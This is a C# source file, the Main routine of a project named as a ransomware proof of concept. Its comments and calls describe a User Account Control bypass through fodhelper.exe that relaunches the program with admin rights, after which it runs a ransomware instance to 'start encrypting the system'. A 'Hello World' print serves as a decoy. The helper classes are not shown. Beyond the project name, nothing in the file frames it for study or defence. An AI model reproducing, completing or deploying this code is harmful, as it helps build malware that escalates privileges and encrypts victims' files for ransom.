using System;
using System.Runtime.InteropServices;

namespace Ilay_sRanomwarePoc
{
    class Program
    {

        static void Main(string[] args)
        {
            
            //the check is for determining weather the program is running as admin. if not,
            //it will execute a privilege esecelation exploit that uses a vulnarbility in fodhelper.exe process
            //the exploit uses that process to execute the malware again by this process on higher privileges
            //on the second instance itll be runnig a admin so we can start encrypting the system 


            if (!PrivilegeEscelator.IsRunnigAsAdmin())
            {
                Console.WriteLine("Hello World");
                PrivilegeEscelator.UserAccountControlBypassOverFodHelperExe();
                Environment.Exit(0);
            }
            RansomwareInstance RansomWare = new RansomwareInstance();
            RansomWare.RansomwareInstanceExecution();
        }
    }
}
